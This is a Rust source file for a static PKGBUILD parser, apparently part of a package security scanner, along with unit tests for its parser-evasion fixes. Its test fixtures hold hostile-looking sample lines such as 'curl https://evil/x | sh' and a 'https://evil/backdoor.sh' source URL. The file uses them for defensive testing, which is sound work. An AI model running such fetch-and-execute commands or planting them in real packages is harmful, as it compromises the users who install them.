//! Static PKGBUILD parser
//!
//! Parses PKGBUILD files using regex patterns without executing bash code.
//! This is safer than sourcing the PKGBUILD but may miss dynamic constructs.

use super::{FunctionBody, ParsedPkgbuild, PkgbuildParser, SourceEntry};
use crate::error::ParseError;
use lazy_static::lazy_static;
use regex::Regex;

lazy_static! {
    // Variable assignment patterns
    static ref VAR_SIMPLE: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=([^(].*?)$"#).unwrap();
    static ref VAR_QUOTED: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=["'](.*)["']$"#).unwrap();

    // Array patterns. Group 2 captures an optional `+` so `name+=(...)` (append)
    // is parsed instead of silently dropped -- a second `source+=(...)` would
    // otherwise never reach the source/checksum analyzers. A single-line array
    // is handled by ARRAY_MULTILINE_START whose content is fed to the quote-aware
    // `array_terminator` scanner (which finds the real closing paren on the same
    // line), so no separate single-line pattern is needed.
    static ref ARRAY_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\($"#).unwrap();
    // Array that starts with content on the first line (single- or multi-line).
    static ref ARRAY_MULTILINE_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\((.+)$"#).unwrap();

    // An assignment-looking line we may fail to fully parse, used only to warn
    // (never silently drop attacker input without a trace).
    static ref ASSIGN_LIKE: Regex = Regex::new(r#"^[a-zA-Z_][a-zA-Z0-9_]*\+?=\("#).unwrap();

    // Function patterns
    static ref FUNC_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\s*\)\s*\{?"#).unwrap();

    // Comment pattern
    static ref COMMENT: Regex = Regex::new(r#"^\s*#"#).unwrap();
}

/// Static parser for PKGBUILD files
pub struct StaticParser {
    strict_mode: bool,
}

impl StaticParser {
    /// Create a new static parser
    pub fn new() -> Self {
        Self { strict_mode: false }
    }

    /// Create a parser in strict mode (fails on missing required fields)
    pub fn strict() -> Self {
        Self { strict_mode: true }
    }

    /// Parse array elements from a string
    fn parse_array_elements(&self, content: &str) -> Vec<String> {
        let mut elements = Vec::new();
        let mut current = String::new();
        let mut in_quote = false;
        let mut quote_char = ' ';
        let mut escape_next = false;

        for ch in content.chars() {
            if escape_next {
                current.push(ch);
                escape_next = false;
                continue;
            }

            match ch {
                '\\' => escape_next = true,
                '"' | '\'' if !in_quote => {
                    in_quote = true;
                    quote_char = ch;
                }
                c if in_quote && c == quote_char => {
                    in_quote = false;
                }
                ' ' | '\t' | '\n' if !in_quote => {
                    let trimmed = current.trim();
                    if !trimmed.is_empty() {
                        elements.push(trimmed.to_string());
                    }
                    current.clear();
                }
                _ => current.push(ch),
            }
        }

        let trimmed = current.trim();
        if !trimmed.is_empty() {
            elements.push(trimmed.to_string());
        }

        elements
    }

    /// Parse checksums into Option<String> (SKIP becomes None)
    fn parse_checksums(&self, elements: &[String]) -> Vec<Option<String>> {
        elements
            .iter()
            .map(|s| {
                let s = s.trim_matches(|c| c == '"' || c == '\'');
                if s == "SKIP" || s.is_empty() {
                    None
                } else {
                    Some(s.to_string())
                }
            })
            .collect()
    }

    /// Extract function body starting from a line.
    ///
    /// Brace balance is tracked with a quote-aware scanner so a `}` inside a
    /// string (`echo "}"`) cannot close the function early and push the rest of
    /// the body -- where a payload could hide -- outside what we parse.
    fn extract_function(&self, lines: &[&str], start_idx: usize) -> Option<(String, usize)> {
        let mut scanner = crate::textutil::BraceScanner::default();
        let mut in_function = false;
        let mut body_lines = Vec::new();
        let mut end_idx = start_idx;

        for (i, line) in lines.iter().enumerate().skip(start_idx) {
            scanner.feed(line);
            // `peak > 0` (not `depth > 0`) so a function whose whole body is on
            // one line (`pkgver() { ...; }`) -- where depth rises to 1 and falls
            // back to 0 within the same fed line -- is still recognized as
            // entered and captured.
            if scanner.peak > 0 {
                in_function = true;
            }

            if in_function {
                body_lines.push(*line);
                if scanner.depth == 0 {
                    end_idx = i;
                    break;
                }
            }
        }

        if !body_lines.is_empty() {
            Some((body_lines.join("\n"), end_idx))
        } else {
            None
        }
    }
}

impl Default for StaticParser {
    fn default() -> Self {
        Self::new()
    }
}

impl PkgbuildParser for StaticParser {
    fn parse(&self, content: &str) -> Result<ParsedPkgbuild, ParseError> {
        if content.trim().is_empty() {
            return Err(ParseError::EmptyContent);
        }

        let mut pkgbuild = ParsedPkgbuild {
            raw_content: content.to_string(),
            ..Default::default()
        };

        let lines: Vec<&str> = content.lines().collect();
        let mut i = 0;

        // Collect multi-line arrays: (name, append?, collected-content).
        let mut pending_array: Option<(String, bool, String)> = None;

        while i < lines.len() {
            let line = lines[i];
            let trimmed = line.trim();

            // Skip comments and empty lines
            if trimmed.is_empty() || COMMENT.is_match(trimmed) {
                i += 1;
                continue;
            }

            // Strip a trailing inline comment for matching, e.g.
            // `source=("x") # note`. The stripper is quote-aware so a `#` inside
            // a value (a VCS `#commit=` fragment, a URL anchor) is preserved.
            let code = strip_inline_comment(trimmed);

            // Handle multi-line array continuation. The array only ends at a `)`
            // that is unquoted and at paren-depth 0 (`array_terminator`); a `)`
            // inside a quoted value -- e.g. a multi-line quoted source whose first
            // physical line ends in `)` -- must NOT close it, or every following
            // source/checksum line would be dropped before reaching the analyzers
            // (defect #3). `take()` so we can re-store the buffer without a borrow
            // conflict when the array is not yet closed.
            if let Some((name, append, mut collected)) = pending_array.take() {
                collected.push('\n');
                collected.push_str(code);

                if let Some(end) = array_terminator(&collected) {
                    let elements = self.parse_array_elements(&collected[..end]);
                    self.assign_array(&mut pkgbuild, &name, elements, append);
                    // pending_array already None (taken); leave it closed.
                } else {
                    pending_array = Some((name, append, collected));
                }
                i += 1;
                continue;
            }

            // Check for array start (multi-line, empty first line)
            if let Some(caps) = ARRAY_START.captures(code) {
                let name = caps.get(1).unwrap().as_str().to_string();
                let append = !caps.get(2).unwrap().as_str().is_empty();
                pending_array = Some((name, append, String::new()));
                i += 1;
                continue;
            }

            // Check for multi-line array with content on first line
            if let Some(caps) = ARRAY_MULTILINE_START.captures(code) {
                let name = caps.get(1).unwrap().as_str().to_string();
                let append = !caps.get(2).unwrap().as_str().is_empty();
                let first_content = caps.get(3).unwrap().as_str();
                // Single-line only when the closing `)` is unquoted at depth 0.
                // A quoted `)` in the first element does not close the array.
                if let Some(end) = array_terminator(first_content) {
                    let elements = self.parse_array_elements(&first_content[..end]);
                    self.assign_array(&mut pkgbuild, &name, elements, append);
                } else {
                    pending_array = Some((name, append, first_content.to_string()));
                }
                i += 1;
                continue;
            }

            // Check for function definition
            if let Some(caps) = FUNC_START.captures(code) {
                let name = caps.get(1).unwrap().as_str().to_string();
                if let Some((body, end_idx)) = self.extract_function(&lines, i) {
                    pkgbuild.functions.insert(
                        name.clone(),
                        FunctionBody {
                            name,
                            content: body,
                            line_start: i + 1,
                            line_end: end_idx + 1,
                        },
                    );
                    i = end_idx + 1;
                    continue;
                }
            }

            // Check for quoted variable assignment
            if let Some(caps) = VAR_QUOTED.captures(code) {
                let name = caps.get(1).unwrap().as_str();
                let value = caps.get(2).unwrap().as_str();
                self.assign_variable(&mut pkgbuild, name, value);
                i += 1;
                continue;
            }

            // Check for simple variable assignment
            if let Some(caps) = VAR_SIMPLE.captures(code) {
                let name = caps.get(1).unwrap().as_str();
                let value = caps
                    .get(2)
                    .unwrap()
                    .as_str()
                    .trim_matches(|c| c == '"' || c == '\'');
                self.assign_variable(&mut pkgbuild, name, value);
                i += 1;
                continue;
            }

            // Nothing matched. If the line *looked* like an array assignment we
            // could not fully parse, leave a trace rather than dropping
            // attacker-controlled input unobserved (a silently-dropped
            // `source+=(...)` would escape source/checksum analysis).
            if ASSIGN_LIKE.is_match(code) {
                tracing::debug!("unparsed assignment-like line {}: {:?}", i + 1, code);
            }

            i += 1;
        }

        // Validate required fields in strict mode
        if self.strict_mode {
            if pkgbuild.pkgname.is_empty() {
                return Err(ParseError::MissingField("pkgname".to_string()));
            }
            if pkgbuild.pkgver.is_empty() {
                return Err(ParseError::MissingField("pkgver".to_string()));
            }
            if pkgbuild.pkgrel.is_empty() {
                return Err(ParseError::MissingField("pkgrel".to_string()));
            }
        }

        Ok(pkgbuild)
    }
}

impl StaticParser {
    /// Assign a scalar variable to the PKGBUILD structure
    fn assign_variable(&self, pkgbuild: &mut ParsedPkgbuild, name: &str, value: &str) {
        match name {
            "pkgname" => pkgbuild.pkgname = vec![value.to_string()],
            "pkgver" => pkgbuild.pkgver = value.to_string(),
            "pkgrel" => pkgbuild.pkgrel = value.to_string(),
            "epoch" => pkgbuild.epoch = Some(value.to_string()),
            "pkgdesc" => pkgbuild.pkgdesc = Some(value.to_string()),
            "url" => pkgbuild.url = Some(value.to_string()),
            "install" => pkgbuild.install = Some(value.to_string()),
            "changelog" => pkgbuild.changelog = Some(value.to_string()),
            _ => {
                pkgbuild.variables.insert(name.to_string(), value.to_string());
            }
        }
    }

    /// Assign an array variable to the PKGBUILD structure
    /// Assign (or, when `append` is true for a `name+=(...)` form, extend) an
    /// array field.
    fn assign_array(
        &self,
        pkgbuild: &mut ParsedPkgbuild,
        name: &str,
        elements: Vec<String>,
        append: bool,
    ) {
        // For Vec<String> fields: replace, or extend when appending.
        let set = |dst: &mut Vec<String>, mut new: Vec<String>| {
            if append {
                dst.append(&mut new);
            } else {
                *dst = new;
            }
        };
        match name {
            "pkgname" => set(&mut pkgbuild.pkgname, elements),
            "arch" => set(&mut pkgbuild.arch, elements),
            "license" => set(&mut pkgbuild.license, elements),
            "depends" => set(&mut pkgbuild.depends, elements),
            "makedepends" => set(&mut pkgbuild.makedepends, elements),
            "checkdepends" => set(&mut pkgbuild.checkdepends, elements),
            "optdepends" => set(&mut pkgbuild.optdepends, elements),
            "provides" => set(&mut pkgbuild.provides, elements),
            "conflicts" => set(&mut pkgbuild.conflicts, elements),
            "replaces" => set(&mut pkgbuild.replaces, elements),
            "backup" => set(&mut pkgbuild.backup, elements),
            "options" => set(&mut pkgbuild.options, elements),
            "source" => {
                let mut parsed: Vec<SourceEntry> =
                    elements.iter().map(|s| SourceEntry::parse(s)).collect();
                if append {
                    pkgbuild.source.append(&mut parsed);
                } else {
                    pkgbuild.source = parsed;
                }
            }
            "md5sums" => self.set_checksums(&mut pkgbuild.checksums.md5sums, &elements, append),
            "sha1sums" => self.set_checksums(&mut pkgbuild.checksums.sha1sums, &elements, append),
            "sha256sums" => self.set_checksums(&mut pkgbuild.checksums.sha256sums, &elements, append),
            "sha512sums" => self.set_checksums(&mut pkgbuild.checksums.sha512sums, &elements, append),
            "b2sums" => self.set_checksums(&mut pkgbuild.checksums.b2sums, &elements, append),
            _ => {
                // Store as JSON array in variables
                pkgbuild
                    .variables
                    .insert(name.to_string(), serde_json::to_string(&elements).unwrap());
            }
        }
    }

    /// Replace or extend a checksum array, mapping `SKIP`/empty to `None`.
    fn set_checksums(&self, dst: &mut Vec<Option<String>>, elements: &[String], append: bool) {
        let mut parsed = self.parse_checksums(elements);
        if append {
            dst.append(&mut parsed);
        } else {
            *dst = parsed;
        }
    }
}

/// Truncate a line at a trailing inline comment, preserving `#` characters that
/// appear inside single/double quotes (so a VCS `#commit=` fragment or a URL
/// anchor in a quoted source value is not mistaken for a comment). A `#` only
/// starts a comment when it is unquoted and preceded by whitespace (or starts
/// the line) -- matching how the shell tokenizes comments.
fn strip_inline_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut prev_ws = true; // start-of-line counts as a word boundary
    for (i, &b) in bytes.iter().enumerate() {
        if escaped {
            escaped = false;
            prev_ws = false;
            continue;
        }
        match b {
            b'\\' if !in_single => {
                escaped = true;
                prev_ws = false;
            }
            b'\'' if !in_double => {
                in_single = !in_single;
                prev_ws = false;
            }
            b'"' if !in_single => {
                in_double = !in_double;
                prev_ws = false;
            }
            b'#' if !in_single && !in_double && prev_ws => {
                return line[..i].trim_end();
            }
            b' ' | b'\t' => prev_ws = true,
            _ => prev_ws = false,
        }
    }
    line
}

/// Find the byte index of the `)` that closes an array body, where `buf` is the
/// accumulated text *after* the opening `name=(`. The terminator is the first
/// `)` that is **unquoted** and at **nested-paren depth 0**. Single/double quote
/// and backslash-escape state is tracked across the whole buffer (matching
/// [`crate::textutil::BraceScanner`]'s convention: `\` escapes outside single
/// quotes; single quotes are literal), so a `)` inside a quoted value -- or a
/// balanced `(...)` inside an unquoted value -- is not mistaken for the end of
/// the array. Returns `None` when the array is still open (more lines follow).
///
/// This is the quote-aware replacement for the old `ends_with(')')` /
/// `trim_end_matches(')')` heuristic, which let an attacker terminate the array
/// early with a quoted `)` and hide every following source/checksum line from
/// the analyzers (defect #3).
fn array_terminator(buf: &str) -> Option<usize> {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut depth: u32 = 0;

    for (idx, ch) in buf.char_indices() {
        if escaped {
            escaped = false;
            continue;
        }
        match ch {
            '\\' if !in_single => escaped = true,
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '(' if !in_single && !in_double => depth += 1,
            ')' if !in_single && !in_double => {
                if depth == 0 {
                    return Some(idx);
                }
                depth -= 1;
            }
            _ => {}
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_PKGBUILD: &str = r#"
# Maintainer: Example <example@example.com>
pkgname=example-package
pkgver=1.0.0
pkgrel=1
pkgdesc="An example package"
arch=('x86_64' 'aarch64')
url="https://example.com"
license=('MIT')
depends=('glibc' 'openssl')
makedepends=('cmake' 'ninja')
source=("https://example.com/example-$pkgver.tar.gz"
        "fix-build.patch")
sha256sums=('abc123def456'
            'SKIP')

build() {
    cd "$srcdir/example-$pkgver"
    cmake -B build -G Ninja
    ninja -C build
}

package() {
    cd "$srcdir/example-$pkgver"
    DESTDIR="$pkgdir" ninja -C build install
}
"#;

    #[test]
    fn test_parse_sample_pkgbuild() {
        let parser = StaticParser::new();
        let result = parser.parse(SAMPLE_PKGBUILD).unwrap();

        assert_eq!(result.pkgname, vec!["example-package"]);
        assert_eq!(result.pkgver, "1.0.0");
        assert_eq!(result.pkgrel, "1");
        assert_eq!(result.pkgdesc, Some("An example package".to_string()));
        assert_eq!(result.arch, vec!["x86_64", "aarch64"]);
        assert_eq!(result.url, Some("https://example.com".to_string()));
        assert_eq!(result.license, vec!["MIT"]);
        assert_eq!(result.depends, vec!["glibc", "openssl"]);
        assert_eq!(result.makedepends, vec!["cmake", "ninja"]);
        assert_eq!(result.source.len(), 2);
        assert_eq!(result.checksums.sha256sums.len(), 2);
        assert!(result.checksums.sha256sums[0].is_some());
        assert!(result.checksums.sha256sums[1].is_none()); // SKIP

        assert!(result.functions.contains_key("build"));
        assert!(result.functions.contains_key("package"));
    }

    #[test]
    fn test_empty_content() {
        let parser = StaticParser::new();
        let result = parser.parse("");
        assert!(matches!(result, Err(ParseError::EmptyContent)));
    }

    #[test]
    fn append_and_inline_comment_sources_are_parsed() {
        // ME-9: `source+=(...)` must extend (not be dropped), a trailing inline
        // comment must not break array parsing, and a `#commit=` fragment inside
        // a quoted value must be preserved (not treated as a comment).
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"https://example.com/a.tar.gz\") # primary\n",
            "source+=(\"git+https://github.com/u/r.git#commit=deadbeef\")\n",
        );
        let result = parser.parse(content).unwrap();
        assert_eq!(result.source.len(), 2, "append must extend the source array");
        assert_eq!(result.source[0].url, "https://example.com/a.tar.gz");
        // The fragment survived (the `#` was not stripped as a comment).
        assert_eq!(result.source[1].fragment.as_deref(), Some("commit=deadbeef"));
        assert!(result.source[1].is_vcs_pinned_commit());
    }

    #[test]
    fn single_line_function_body_is_captured() {
        // Regression: a function whose whole body is on one line must still be
        // captured so function-scoped analyzers (privilege, FUNC-001) see it.
        let parser = StaticParser::new();
        let content = "pkgname=t\npkgver=1\npkgrel=1\npackage() { install -Dm755 evil \"$pkgdir/x\"; }\n";
        let result = parser.parse(content).unwrap();
        let body = &result.functions.get("package").expect("package() captured").content;
        assert!(body.contains("install -Dm755 evil"), "one-line body must be captured: {body}");
    }

    #[test]
    fn comment_brace_does_not_truncate_function_body() {
        // The `}` in a comment must not end the function early and hide the
        // sudo line from the body.
        let parser = StaticParser::new();
        let content = "pkgname=t\npkgver=1\npkgrel=1\nbuild() {\n  : # note }\n  sudo evil-thing\n}\n";
        let result = parser.parse(content).unwrap();
        let body = &result.functions.get("build").expect("build captured").content;
        assert!(body.contains("sudo evil-thing"), "payload after comment-brace must stay in body: {body}");
    }

    #[test]
    fn brace_in_string_does_not_truncate_function_body() {
        // HI-6e: a `}` inside a quoted string must not close the function early.
        // The payload after it must remain part of the parsed build() body so the
        // privilege/pattern analyzers still see it.
        let parser = StaticParser::new();
        let content = "pkgname=t\npkgver=1\npkgrel=1\n\nbuild() {\n  echo \"}\"\n  curl https://evil/x | sh\n}\n";
        let result = parser.parse(content).unwrap();
        let body = &result.functions.get("build").expect("build present").content;
        assert!(
            body.contains("curl https://evil/x | sh"),
            "payload after `echo \"}}\"` must stay in the body, got:\n{body}"
        );
    }

    #[test]
    fn test_strict_mode_missing_fields() {
        let parser = StaticParser::strict();
        let result = parser.parse("pkgdesc='test'");
        assert!(matches!(result, Err(ParseError::MissingField(_))));
    }

    #[test]
    fn quoted_paren_does_not_terminate_array_early() {
        // Defect #3 (parser evasion): the first element opens a `"` whose value
        // contains `)` and spans to the next physical line. The first line ends
        // with `)`, but it is INSIDE the quote, so the array must NOT close there.
        // Before the fix, the array terminated on line 1 and the entire malicious
        // `https://evil/backdoor.sh` source was dropped before any analyzer saw it.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"https://legit/a.tar.gz)\n",
            "        x\" \"https://evil/backdoor.sh\")\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert!(
            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
            "malicious source must not be hidden by a quoted `)`; got {urls:?}"
        );
        assert_eq!(result.source.len(), 2, "both array elements must survive: {urls:?}");
    }

    #[test]
    fn quoted_paren_in_continuation_keeps_following_lines() {
        // Same evasion across an empty-first-line multi-line array: a quoted `)`
        // on a continuation line must not drop the checksum line that follows.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\n",
            "        \"git+https://h/r.git#branch=v1)\n",
            "        more\"\n",
            "        \"https://evil/backdoor.sh\")\n",
            "sha256sums=('AAA'\n",
            "            'BBB')\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert!(
            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
            "source after a quoted `)` continuation line must survive; got {urls:?}"
        );
        // The checksum array (after the source array) must still be parsed.
        assert_eq!(
            result.checksums.sha256sums.len(),
            2,
            "checksum array following the evaded source array must not be dropped"
        );
    }

    #[test]
    fn nested_parens_in_unquoted_value_do_not_terminate_early() {
        // A balanced `(...)` inside an array value must not be read as the close.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"https://example.com/file-(1).tar.gz\"\n",
            "        \"https://example.com/second.tar.gz\")\n",
        );
        let result = parser.parse(content).unwrap();
        assert_eq!(result.source.len(), 2);
        assert!(result.source[1].url.contains("second.tar.gz"));
    }

    #[test]
    fn test_multiline_array() {
        let content = r#"
pkgname=test
pkgver=1.0
pkgrel=1
source=(
    "https://example.com/file1.tar.gz"
    "https://example.com/file2.tar.gz"
)
"#;
        let parser = StaticParser::new();
        let result = parser.parse(content).unwrap();
        assert_eq!(result.source.len(), 2);
    }
}
